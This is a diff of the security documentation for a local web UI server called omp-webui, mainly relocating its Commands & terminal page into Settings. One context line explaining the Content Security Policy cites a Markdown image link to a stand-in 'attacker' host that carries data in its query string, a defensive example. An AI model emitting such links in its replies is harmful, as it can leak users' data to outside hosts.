@@ -1,7 +1,7 @@
 ---
 title: The server and its security
 summary: The local omp-webui server: its data folder, the access token, the address it listens on, which routes are for this computer only, the environment variables it reads, the request checks and Content Security Policy, the Commands & terminal page, the Host tab, and the running omp processes.
-settings: config, running
+settings: cli, config, running
 ---
 
 # The server and its security
@@ -24,7 +24,7 @@ settings: config, running
 
 **Content Security Policy.** Every page is served with a policy confining it to its own origin: images only from the server, `data:` and `blob:`; connections only back to the server (HTTP and WebSocket); scripts only the page's own files plus the one inline script by its hash; no plugins, no framing. A model's reply rendering `![x](https://attacker/?d=…)` therefore fetches nothing.
 
-**Commands & terminal page** (sidebar *Commands & terminal*). It lists omp's CLI commands and flags, discovered at run time from `omp --help` and `omp <command> --help` (so new omp commands appear by themselves), with a filter, each command's help, an **Arguments & flags** form and **Run any command line**. Commands run in a real pseudo-terminal on this computer (interactive ones too), streamed over the WebSocket. Settings › App & system › **omp configuration** opens `omp config`, `omp models`, `omp plugin`, `omp login` or `omp update` there; changes apply to new sessions.
+**Commands & terminal page** (a page of Settings: Settings › App & system › **Commands & terminal** › **Open Commands & terminal**, `#/settings/cli`; the older addresses `#/cli` and `#/cli/<command>` open it too and are rewritten to the new ones). It lists omp's CLI commands and flags, discovered at run time from `omp --help` and `omp <command> --help` (so new omp commands appear by themselves), with a filter, each command's help, an **Arguments & flags** form and **Run any command line**. Commands run in a real pseudo-terminal on this computer (interactive ones too), streamed over the WebSocket. A row over the page says where it is (Settings › Commands & terminal) and goes back to Settings. Settings › App & system › **omp configuration** opens `omp config`, `omp models`, `omp login` or `omp update` there, and its **Plugins** button opens the Plugins page (see [plugins.md](plugins.md)); changes apply to new sessions. A conversation's menu **Open in terminal** opens it on `omp --resume <file>`.
 
 **Host load.** The server samples the computer's CPU, GPU (macOS, through IOKit) and memory (with memory pressure where the system reports it): every 2 s while a page shows the graphs, every 10 s otherwise. It keeps the last hour (one point per sample) and the last day (one point per minute), in memory only. The sidebar shows a line of figures; its popover and the side panel's **Host** tab show tiles and graphs (1 h / 24 h) and per-process figures.
 
@@ -32,9 +32,10 @@ settings: config, running
 
 ## Where it is
 
-- **Settings › App & system › omp configuration** (`#/settings/app`): buttons `omp config`, `omp models`, `omp plugin`, `omp login`, `omp update` (open the Commands & terminal page on that command).
+- **Settings › App & system › Commands & terminal** (`#/settings/app`, card `cli`): **Open Commands & terminal** (`#/settings/cli`). Settings' search finds it as *Commands & terminal* / *命令与终端* (and *terminal*, *command*, *终端*, *命令*). The command palette's Go to lists it too.
+- **Settings › App & system › omp configuration**: buttons `omp config`, `omp models`, `omp login`, `omp update` (open Commands & terminal on that command) and **Plugins** (the Plugins page).
 - **Settings › App & system › Running sessions**, then the versions and directories.
-- Sidebar / rail **Commands & terminal** (`cli`).
+- The sidebar and the rail do not list Commands & terminal: the Plugins page took its place there.
 - The sidebar's host load line, its popover, and the side panel's **Host** tab.
 - The unlock screen, when a page has no token.
 
